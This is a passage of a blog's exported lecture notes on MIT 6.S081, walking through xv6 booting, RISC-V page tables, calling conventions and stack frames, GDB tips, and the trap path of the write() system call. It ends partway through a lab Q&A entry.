<p>Another style, which aims at running as fewer lines as possible in the kernel to avoid bug risks, is called micro kernel design. The kernel only contains some core modules and other modules like file system are run in user mode and treated like ordinary user applications. The challenge for this design is how to improve performance. For example, if an application wants to access the file system, frequent jumps between kernel mode and user mode are needed to achieve that. (app(u) $\rightarrow$ IPC(k) $\rightarrow$ FS(u) $\rightarrow$ IPC(k) $\rightarrow$ app(u))</p>
<h2 id="Xv6-Code-Details"><a href="#Xv6-Code-Details" class="headerlink" title="Xv6 Code Details"></a>Xv6 Code Details</h2><p>Xv6 uses monolithic kernel design. All the <code>*.c</code> programs in <code>/kernel</code> are run in kernel mode. The Makefile grabs all the C files in <code>/kernel</code> and generates relocatable files: <code>*.c</code>$\overset{CC}{\rightarrow}$<code>*.S</code>$\overset{AS}{\rightarrow}$<code>*.o</code>. ld is responsible for linking all the <code>*.o</code> files and generate an executable file <code>/kernel/kernel</code>. <code>/kernel/kernel.asm</code> containing disassembled code of the kernel will also be generated for debugging.</p>
<p>Xv6 starts at address 0x80000000. The code is written directly in assembly and is in <code>/kernel/entry.S</code>. <code>/kernel/kernel.ld</code> ensures that the assembly code will be linked to 0x80000000. Currently, xv6 runs in machine mode - no protection, no virtual memory etc. The job for xv6 is to enter supervisor mode(kernel mode) as soon as possible.</p>
<p>When xv6 jumps to <code>main()</code> in <code>/kernel/main.c</code>, it has been in supervisor mode. Here we use <code>make CPUS=1 qemu-gdb</code> to fire up xv6, so there’s only one CPU core in our simulated CPU. The code in <code>main()</code> is shown as below:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Xv6 initializes lots of things and then jumps to <code>userinit()</code> run the first process. <code>userinit()</code> (in <code>/kernel/proc.c</code>) loads the first process. Because currently xv6 hasn’t built the file system and cannot load images, the assembly code is statically declared in the array <code>initcode[]</code>. The assembly code of the “first process loader” is in <code>/user/initcode.S</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Initial process that execs /init.</span><br><span class="line"># This code runs in user space.</span><br><span class="line"></span><br><span class="line">#include &quot;syscall.h&quot;</span><br><span class="line"></span><br><span class="line"># exec(init, argv)</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">        la a0, init</span><br><span class="line">        la a1, argv</span><br><span class="line">        li a7, SYS_exec</span><br><span class="line">        ecall</span><br><span class="line"></span><br><span class="line"># for(;;) exit();</span><br><span class="line">exit:</span><br><span class="line">        li a7, SYS_exit</span><br><span class="line">        ecall</span><br><span class="line">        jal exit</span><br><span class="line"></span><br><span class="line"># char init[] = &quot;/init\0&quot;;</span><br><span class="line">init:</span><br><span class="line">  .string &quot;/init\0&quot;</span><br><span class="line"></span><br><span class="line"># char *argv[] = &#123; init, 0 &#125;;</span><br><span class="line">.p2align 2</span><br><span class="line">argv:</span><br><span class="line">  .long init</span><br><span class="line">  .long 0</span><br></pre></td></tr></table></figure>

<p><code>initcode.S</code> prepares arguments for the <code>SYS_exec</code> system call and uses <code>ecall</code> instruction to go back to kernel space. <code>ecall</code> will lead us to <code>syscall()</code> in <code>/kernel/syscall.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The variable num’s value, after the instruction <code>num = p-&gt;trapframe-&gt;a7</code>, equals 7, which is <code>SYS_exec</code>‘s value defined in <code>/kernel/syscall.h</code>. The kernel knows that some user program wants to use the exec system call, so it goes to <code>syscalls[num]()</code>, which is a function table for providing system call services.</p>
<p>The function <code>sys_exec()</code> is in <code>/kernel/sysfile.c</code>. In line 444:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ret = exec(path, argv)</span><br></pre></td></tr></table></figure>

<p>If we print the value of “path”, we will find that it equals “/init”. So xv6 loads user program <code>/user/init.c</code>.</p>
<p><code>init.c</code> mainly forks some child processes and exec <code>sh.c</code>, so xv6 starts the shell and the booting procedure is completed.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 04: Page Tables</title>
    <url>/2022/01/27/MIT-6.S081%20Lecture%2004%20-%20Page%20Tables/</url>
    <content><![CDATA[<h2 id="Address-Spaces"><a href="#Address-Spaces" class="headerlink" title="Address Spaces"></a>Address Spaces</h2><p>Virtual memory helps realize memory isolation. The basic idea is simple: we want each process to have its own address space. The address spaces are independent.</p>
<span id="more"></span>

<h2 id="Paging-Hardware"><a href="#Paging-Hardware" class="headerlink" title="Paging Hardware"></a>Paging Hardware</h2><p>We need a method to maintain the mappings of virtual memory to physical memory. The most common method is to maintain page tables.</p>
<p>We should be aware that page table is a hardware mechanism: all the addresses that the CPU gets are virtual addresses. The memory management unit (MMU) is responsible for translating virtual addresses to physical addresses according to the page table and we use the “pa” to access main memory. The page tables are stored somewhere in the main memory and the satp register in the CPU stores the physical address the current page table.</p>
<p>If we maintain the mappings for each virtual address, we will have $2^{64}$ entries and it’s obviously unreasonable. Actually we maintain the mappings for <strong>pages</strong>. The size of each page is 4096 bytes. i.e. The lower 12 bits of va are offset in page. We use 39 bits virtual address - 27 bits for VPN and 12 for offset, and we use 56 bits physical address.</p>
<p>Maintaining $2^{27}$ entries is also a huge task. If all the processes store their page table in the memory, the physical memory will soon be used up. The real RISC-V design of page table has multi-level page tables. The 27 bits are divided into 9+9+9. We use the top 9 bits to index the page directory, and we get the physical address of the lower level page directory. Then we use the second 9 bits to index the next page directory… Each page table/directory is stored in a page. Since each page is 4KB in size and each PTE is 8B in size, there are $512=2^9$ entries in a page, that’s where the “9” comes from.</p>
<p>The advantage of the page table tree is that we can leave unused page table entry empty. In that case, we don’t need to create the lower-level page tables for that entry, and it greatly saves memory space.</p>
<p>The hierarchical page tables make the translation very expensive. In modern design there’s a kind of “cache of PTE entries”, called <strong>Translation Look-aside Buffer (TLB)</strong>, that helps accelerate the procedure. It stores the recently used [VA,PA] mappings and before translation you can firstly refer to to TLB to see if the mapping exists. </p>
<p>In most architectures, the TLB is transparent to the OS. i.e. OS doesn’t care about the implementation details of TLB. It just needs to be aware of the existence of TLB and when switching page tables, it needs to flush the TLB. (In RISC-V, that’s the instruction <code>sfence.vma()</code>)</p>
<h2 id="Code-xv6-VMcode-amp-Layout"><a href="#Code-xv6-VMcode-amp-Layout" class="headerlink" title="Code: xv6 VMcode &amp; Layout"></a>Code: xv6 VMcode &amp; Layout</h2><p>In xv6, physical addresses above 0x80000000 are mapped to the DRAM chips. physical addresses below 0x80000000 are used by I/O devices.</p>
<p>For simplicity, the kernel mappings are identity mappings. i.e. va=pa. Pages for kernel stacks and guard pages are exceptions: guard pages are not mapped so they’re put in the high address of virtual address space to save physical memory space. Refer to the “Xv6-book Notes” for details.</p>
<p>Refer to the “Xv6 Source code Manual” for details about how the kernel sets up the kernel address space.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 05: RISC-V Calling Convention and Stack Frames</title>
    <url>/2022/01/28/MIT-6.S081%20Lecture%2005%20-%20RISCV%20Calling%20Convention%20and%20Stack%20Frames/</url>
    <content><![CDATA[<h2 id="C-rightarrow-ASM"><a href="#C-rightarrow-ASM" class="headerlink" title="C $\rightarrow$ ASM"></a>C $\rightarrow$ ASM</h2><p>A C program</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main () &#123;</span><br><span class="line">	...</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cannot be directly understood by a processor. It should go through a “C -&gt; Asm (<code>.s</code> files) -&gt; binary (<code>.o</code> files) “ process.</p>
<span id="more"></span>

<p>RISC-V is a reduced instruction set while x86/x86-64, which is common in personal computers, is a complex instruction set. CISC has far more instructions and more complex instruction structure than RISC. CISC has some “big” instruction that does lots of things, while in RISC we use several “small” instructions together to achieve that.</p>
<p>RISC-V has a base integer instruction set, which supports basic functions. A RISC-V processor can also choose to include some extension module to support more complicated functions. For example, if a RISC-V processor includes the “F” standard extension, it can support instructions about single-precision floating-point. Extension modules make RISC-V processors to have backward compatibility. If one day, a new extension is added, and the compiler will get the message from the processor and it can use new instructions to do the compilation.</p>
<h2 id="RISC-V-Registers"><a href="#RISC-V-Registers" class="headerlink" title="RISC-V Registers"></a>RISC-V Registers</h2><img src="https://kristoff-starling.github.io/files/MIT-6.S081-lecture05.png" alt="registers" style="zoom:33%;" />

<blockquote>
<p><strong>Why <code>s1</code> register is separated from other s-series registers?</strong></p>
<p>RISC-V has a compressed version of instructions which have only 16 bits. In this version, only 8 registers (x8-x15) are used. (Just a guess)</p>
</blockquote>
<p>When function A is calling function B, for register <code>x</code>:</p>
<ul>
<li>If <code>x</code> is a caller-saved register, e.g <code>ra</code>, A is responsible for saving its value on the stack and B can overwrite <code>x</code> without saving it.</li>
<li>If <code>x</code> is a callee-saved register, A don’t need to save its value before calling B and B should save <code>x</code>‘s value on the stack before using it, and before returning, B is responsible for restore <code>x</code>‘s value.</li>
</ul>
<h2 id="Stack-Frames"><a href="#Stack-Frames" class="headerlink" title="Stack Frames"></a>Stack Frames</h2><table>
<thead>
<tr>
<th>return address <code>*</code></th>
</tr>
</thead>
<tbody><tr>
<td>previous fp</td>
</tr>
<tr>
<td>saved registers</td>
</tr>
<tr>
<td>local variables</td>
</tr>
<tr>
<td>…</td>
</tr>
<tr>
<td><strong>return address</strong>                                      <code>fp</code> register</td>
</tr>
<tr>
<td>previous fp (pointed to <code>*</code>)</td>
</tr>
<tr>
<td>saved registers</td>
</tr>
<tr>
<td>local variables</td>
</tr>
<tr>
<td>…                                                               <code>sp</code> register</td>
</tr>
</tbody></table>
<p>Stack frames may have different sizes and contents, but the general structure is similar: every stack frame begins with the return value of this function and the value of <code>fp</code> register in the previous function. <code>sp</code> register always points to the bottom of the current stack frame while <code>fp</code> register always points to the top of the current stack frame. When <code>ret</code> instruction is executed, pseudo code below will be implemented to adjust stack pointers and PC:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pc = return address</span><br><span class="line">sp = fp + ENTRY_SIZE</span><br><span class="line">fp = previous fp</span><br></pre></td></tr></table></figure>

<p>To comply with the calling conventions, the assembly of a function usually consists of a “prologue”, a “body part” and a “epilogue”. In the prologue, the function modifies <code>sp</code> <code>fp</code> registers and creates the stack frame (save values of needed registers). In the epilogue, the function modifies <code>sp</code> <code>fp</code> registers and restore values of callee-saved registers.</p>
<p>For example, the assembly of a simple function <code>sum_then_double</code> which calls function <code>sum_to</code> is shown below (note: the <code>.global</code> sign means that the function can be fetched at any place): </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global sum_then_double</span><br><span class="line">sum_then_double:</span><br><span class="line">	addi sp, sp, -16		# prologue</span><br><span class="line">	sd ra, 0(sp)			</span><br><span class="line">	</span><br><span class="line">	call sum_to</span><br><span class="line">	li t0, 2</span><br><span class="line">	mul a0, a0, t0</span><br><span class="line">	</span><br><span class="line">	ld ra, 0(sp)			# epilogue</span><br><span class="line">	addi sp, sp, 16</span><br><span class="line">	</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<p><code>ra</code> is a caller-saved register, so before calling <code>sum_to</code>, <code>sum_then_double</code> should firstly save the return address on the stack to avoid <code>ra</code> being overwritten by <code>sum_to</code>. At last, <code>sum_then_double</code> restore the value of <code>ra</code> from the stack. </p>
<p>If we delete the prologue and epilogue:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global sum_then_double</span><br><span class="line">sum_then_double:		</span><br><span class="line">	</span><br><span class="line">	call sum_to</span><br><span class="line">	li t0, 2	(*)</span><br><span class="line">	mul a0, a0, t0</span><br><span class="line">	</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<p>The processor will fall into a dead loop: <code>sum_to</code> modifies <code>ra</code>‘s value to the address of the next instruction. (*), so when <code>sum_then_double</code> execute <code>ret</code>, it cannot trace back to its caller and will go to <code>li t0, 2</code>.</p>
<h2 id="GDB-Skills"><a href="#GDB-Skills" class="headerlink" title="GDB Skills"></a>GDB Skills</h2><ul>
<li><p>Use <code>layout src</code> <code>layout asm</code> <code>layout reg</code> to open a tui window and display source code, assembly code or register values. Use <code>layout split</code> to display source code and assembly code at the same time. Use <code>focus src/asm/reg</code> to switch between different windows.</p>
</li>
<li><p>Use <code>i frame</code> to display information of the current stack frame.</p>
</li>
<li><p>Use <code>backtrace/bt</code> to display previous calling functions. Furthermore, use <code>i frame #num</code> to specify a stack frame to print.</p>
</li>
<li><p>Use <code>p [variable]</code> to print values of variables. Notice that modern compilers have compiling optimization and some variables may be optimized out.</p>
<p>  If <code>x</code> is a pointer variable, <code>p *x</code> can dereference the pointer and print the value.</p>
</li>
<li><p>Use <code>i args</code> to print the arguments of the current function. <code>p *argv</code> can print the first argument. If you want to get a complete list of arguments, use <code>p *argv@argc</code>.</p>
</li>
<li><p>Watchpoints are used to monitor variables and gdb stops running as soon as the values of the expressions of the watchpoints change.</p>
</li>
<li><p>conditional breakpoint is very powerful. For example, if you want to set a breakpoint in a for-loop but only want to trigger it when <code>i=5</code>, use <code>b ... if i==5</code>.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 06: Traps</title>
    <url>/2022/01/30/MIT-6.S081%20Lecture%2006%20-%20Traps/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>When going into traps, we need to carefully change the hardware state so that isolation will not be broken. The hardware state of RISC-V machine includes:</p>
<ul>
<li><p>32 general registers</p>
<p>  We keep a copy of general registers because we want to resume the user code later transparently, particularly when it’s a unexpected device interrupt.</p>
</li>
<li><p>PC</p>
</li>
<li><p>Mode: we need to switch to supervisor mode.</p>
<p>  Supervisor mode has the following privileges:</p>
<ul>
<li>read/write control registers</li>
<li>use PTEs without PTE_U sign.</li>
</ul>
</li>
<li><p>Page table (satp): page table currently points to the user page table, which only contains user’s code and data. To run kernel code, we need to switch to kernel page table.</p>
</li>
<li><p>stvec</p>
</li>
<li><p>sepc</p>
</li>
<li><p>sscratch</p>
</li>
</ul>
<span id="more"></span>

<p>There are some high-level principles of trap design:</p>
<ul>
<li><strong>We cannot count on anything in the user space</strong>. We can’t assume anything about the registers since they are likely to contain malicious values. In xv6, the trap handler just saves them.</li>
<li>We want to be <strong>transparent</strong> to the user code.</li>
</ul>
<h2 id="The-high-level-procedure-of-a-system-call"><a href="#The-high-level-procedure-of-a-system-call" class="headerlink" title="The high-level procedure of a system call"></a>The high-level procedure of a system call</h2><p>Shell $\rightarrow$ write() $\overset{ecall}{\rightarrow}$ uservec (asm) $\rightarrow$ usertrap() $\rightarrow$ syscall() $\rightarrow$ sys_write() $\rightarrow$ syscall() $\rightarrow$ usertrapret() $\rightarrow$ userret (asm) $\rightarrow$ the next instruction of <code>ecall</code>.</p>
<blockquote>
<p><strong>System call is quite expensive. So can we return some address mappings instead of a file descriptor in <code>open()</code> , so that the user program can directly write to the memory without using system calls?</strong></p>
<p>Yes. Modern operating systems support this mechanism and it’s called memory mapped file access. It makes read/write much faster compared with the file descriptor method.</p>
</blockquote>
<h2 id="Code-write-system-call"><a href="#Code-write-system-call" class="headerlink" title="Code: write() system call"></a>Code: <code>write()</code> system call</h2><h3 id="Preliminaries"><a href="#Preliminaries" class="headerlink" title="Preliminaries"></a>Preliminaries</h3><p>The shell program uses <code>write()</code> system call to print a <code>$</code> to the console.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">putc</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(fd, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write() function is defined in <code>usys.asm</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>

<p>It loads the system call number “SYS_write” into register <code>a7</code>. <code>a0</code> <code>a1</code> <code>a2</code> stores the arguments of the system call. In GDB, we can use <code>x/2c $a1</code> to print the argument strings.</p>
<blockquote>
<p><strong>GDB Tips</strong></p>
<p>Use <code>b *addr</code> to set a breakpoint at a specific address. This method is useful when we want to set breakpoints at particular instructions.</p>
</blockquote>
<p>Before switching to kernel, we are using the user page table. We cannot print the page table in GDB, but luckily, QEMU provides functions to print the current page table. Type <code>&lt;c-a&gt;</code> <code>c</code> to get into the QEMU monitor, and type <code>info mem</code> to print the page table:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000000000000 0000000087f60000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000001000 0000000087f5d000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000002000 0000000087f5c000 0000000000001000 rwx----</span><br><span class="line">0000000000003000 0000000087f5b000 0000000000001000 rwxu-ad</span><br><span class="line">0000003fffffe000 0000000087f6f000 0000000000001000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure>

<p>The last column shows the privilege flags of PTEs. The first and second PTEs are code and data page of the shell program. The third page, which doesn’t have the PTE_U flag, is the guard page below the stack page. The fourth page is the stack page. The last two pages, which have high virtual addresses, are the trap frame and the trampoline page. Those pages also don’t have PTE_U flag and can only be accessed by the kernel.</p>
<blockquote>
<p><strong>PTE’s PTE_A &amp; PTE_D flags</strong></p>
<p>xv6 doesn’t use these flags. These flags are used for page exchanges when there’s a page fault and the physical memory pages are used out.</p>
</blockquote>
<h3 id="Trampoline"><a href="#Trampoline" class="headerlink" title="Trampoline"></a>Trampoline</h3><p>We’re now ready for executing <code>ecall</code>. After executing <code>ecall</code>, our PC register goes to the trampoline page: 0x3fffff000. <code>ecall</code> doesn’t switch the page table, which means that the trampoline page must be mapped in the user page table. Although user page table contains this mapping, the corresponding PTE doesn’t have PTE_U flag so this page is protected against user code.</p>
<p><code>ecall</code> actually does 3 things:</p>
<ul>
<li>Switch from user mode to supervisor mode.</li>
<li>Save the value of PC into sepc.</li>
<li>Jump to the address held in stvec register.</li>
</ul>
<p><code>ecall</code> only does the minimum things. Some hardware does more when triggering a system call: they save the registers, switch the page table and set the stack pointer. RISC-V doesn’t choose to include those parts into the hardware because it wants the software to achieve the maximum flexibility. For example:</p>
<ul>
<li>In some system calls the kernel can finish jobs without the help of kernel page table. Also, some operating systems combine the user page table and kernel page table together, which means they don’t need to change the page table during system calls.</li>
<li>According to the specific function, some system calls won’t use all the general registers and some registers’ values don’t need to be saved.</li>
<li>Some easy system call may not require a kernel stack. Stack switching is not necessary.</li>
</ul>
<p>Although xv6 doesn’t utilize those freedom, modern operating systems care a lot about the performance. There are a lot of sophisticated, clever schemes that make full use of the flexibility and achieve better efficiency.</p>
<p>If we check the general registers’ values, we’ll find that they are the same as those in the user space. Currently we cannot modify any register, otherwise the user data would be damaged. We should firstly store them somewhere and restore them before returning. </p>
<p>Some hardware may switch to the kernel page table and store the 32 values somewhere in a physical page. But now we even don’t know the address of the kernel page table! xv6’s solution for saving registers includes two parts:</p>
<ul>
<li>Use a trap frame. User page table contains the mapping of this per-process trap frame. The trap frame contains 32 slots for register values, and some other useful values such as the address of kernel page table.</li>
<li>The (virtual) address of the trap frame is beforehand stored in sscratch register. xv6 utilize <code>csrrw</code> instruction to atomically swap the values in a0 and sscratch. So sscratch temporarily stores the old value of a0 and a0 contains the address of the trap frame. We now can use <code>sd</code> instruction to save register values in the slots.</li>
</ul>
<blockquote>
<p><strong>Q: Where does the kernel set the value of sscratch register?</strong></p>
<p>The function usertrapret() in <code>/kernel/trap.c</code> sets control registers including stvec, sscratch etc.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">w_stvec(TRAMPOLINE + (uservec - trampoline));</span><br><span class="line"></span><br><span class="line">p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_sstatus();</span><br><span class="line">x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">w_sstatus(x);</span><br><span class="line"></span><br><span class="line">w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line">uint64 fn = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">((<span class="keyword">void</span> (*)(uint64,uint64))fn)(TRAPFRAME, satp);</span><br></pre></td></tr></table></figure>

<p>The last line calls userret() and transmits two arguments including the address of TRAPFRAME, in userrret(), TRAPFRAME is stored into sscratch register.</p>
</blockquote>
<blockquote>
<p><strong>Q: Every time after <code>ecall</code>, we have a chance to execute usertrapret() and set the correct value in sscratch, but how do we set it correctly before the first execution?</strong></p>
<p>When xv6 is booting, it firstly goes into the supervisor mode. So the kernel also use usertrapret() to start executing a user program. usertrapret() is the only way xv6 provides to enter into the user program from the kernel.</p>
</blockquote>
<blockquote>
<p><strong>Q: Why should we use a particular trap frame instead of saving the values on the user stack?</strong></p>
<p>Not all the program languages have the same stack structure. Some program languages don’t have a stack, and some languages organize stack space in a weird way that kernel cannot understand (e.g. by allocating memory blocks). The principle for trap design is that <strong>the kernel cannot count on anything from the user space</strong>. The safest way for kernel is to save the values in the trap frame - a frame that belongs to the kernel and is reliable.</p>
</blockquote>
<p>(Author’s question: can we use a control register in RISC-V to store the address of kernel stack and save the register values on the kernel stack? In this way we don’t need an additional trap frame?)</p>
<p>After saving registers, the kernel use <code>ld sp, 8(a0)</code> to load the address of kernel stack into the sp register. If we type <code>print/x $sp</code> in GDB, we’ll see that <code>sp = 0x3fffffc000</code>. Recalling the structure of kernel space mappings, the address is reasonable - just below the trap frame, there’s a guard page and the first kernel stack.</p>
<p>Next, the hart id is stored into tp register. The address of the function to be jumped to (usertrap()) is stored into t0 register. <code>csrw satp, t1</code> switches to the kernel page table.</p>
<blockquote>
<p><strong>Q: Why doesn’t the kernel crash since we keep using user’s virtual addresses?</strong></p>
<p>That’s because we’re executing in the trampoline page. The kernel and user page tables both have mappings to the trampoline page. (The same virtual address) The page is named “trampoline” because xv6 bounces on this page between user code and kernel code.</p>
<p>An important thing to remember is that: <strong>page table switching can only be implemented in the trampoline</strong> because the virtual address in this page maps to the same physical page in kernel and user page tables. Otherwise, the instruction addresses could not be interpreted and the kernel would crash.  </p>
</blockquote>
<h3 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap()"></a>usertrap()</h3><p>After executing <code>jr t0</code>, we jump to the C-code function usertrap(). The first thing we do is</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">w_stvec((uint64)kernelvec)</span><br></pre></td></tr></table></figure>

<p>which overwrites the stvec register. Xv6 handles traps differently depending on whether they come from user space or the kernel.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">p-&gt;trapframe-&gt;epc = r_sepc();</span><br></pre></td></tr></table></figure>

<p>These lines save the value of sepc into the trap frame. It’s necessary because the kernel may switch to another process. After returning to the user space of that process, the user program may do another system call, and the sepc register will be overwritten. (Note: it’s also correct to save sepc in the trampoline assembly code.)</p>
<p>Here we’re doing <code>write()</code> system call, so the value in scause register is 8. We firstly add 4 to the sepc value in the trap frame in order not to re-execute the <code>ecall</code> instruction. Then we call intr_on() to accept interrupts. <u>Interrupts are always turned off by the RISC-V trap hardware, so we need to explicitly open it in the code</u>.</p>
<p>Xv6 enters syscall() in <code>/kernel/syscall.c</code> to handle system calls. In syscall(), xv6 retrieves the value in the a7 register (context in trap frame) to acquire the system call number and uses that to index the syscalls[] function array. After returning from sys_write(), the return value is stored in p-&gt;trapframe-&gt;a0.</p>
<h3 id="usertrapret-userret"><a href="#usertrapret-userret" class="headerlink" title="usertrapret()/userret()"></a>usertrapret()/userret()</h3><p>After handling the system call, xv6 enters usertrapret(). The job for usertrapret() is to set control registers to appropriate states for user mode. At the end, it calls userret() in <code>/kernel/trampoline.S</code> to resume registers. Refer to code details in “Xv6 Source Code Manual”.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 07: Q&amp;A for Labs #1</title>
    <url>/2022/02/01/MIT-6.S081%20Lecture%2007%20-%20QA%20for%20Labs%201/</url>
    <content><![CDATA[<p>The Q&amp;A focuses on lab pgtbl. The lab contain few lines of code, but hard-to-debug problems. Harsh environment of kernel programming makes it more difficult.</p>
<span id="more"></span>

<h2 id="Task-01"><a href="#Task-01" class="headerlink" title="Task 01"></a>Task 01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page table 0x0000000087f6e000</span><br><span class="line">..0: pte 0x0000000021fda801 pa 0x0000000087f6a000</span><br><span class="line">.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000</span><br><span class="line">.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000</span><br><span class="line">.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000</span><br><span class="line">.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000</span><br><span class="line">..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000</span><br><span class="line">.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000</span><br><span class="line">.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000</span><br><span class="line">.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000</span><br></pre></td></tr></table></figure>

<ul>
<li>0-0-0: text and data of the <code>init</code> program.</li>
<li>0-0-1: the guard page (of the user stack)</li>
<li>0-0-2: user stack (tighter privilege can be set: PTE_X flags can be erased, the user stack is not supposed to store instructions.)</li>
<li>255-511-510: trap frame</li>
<li>255-511-511: trampoline</li>
</ul>
<p>One interesting fact is that: the physical pages allocated to the continuous virtual pages are not continuous. That’s the magic of virtual memory.</p>
<blockquote>
<p><strong>Q: The trampoline page is at the highest virtual memory address MAXVA, why the first page directory’s index is 255 instead of 511?</strong></p>
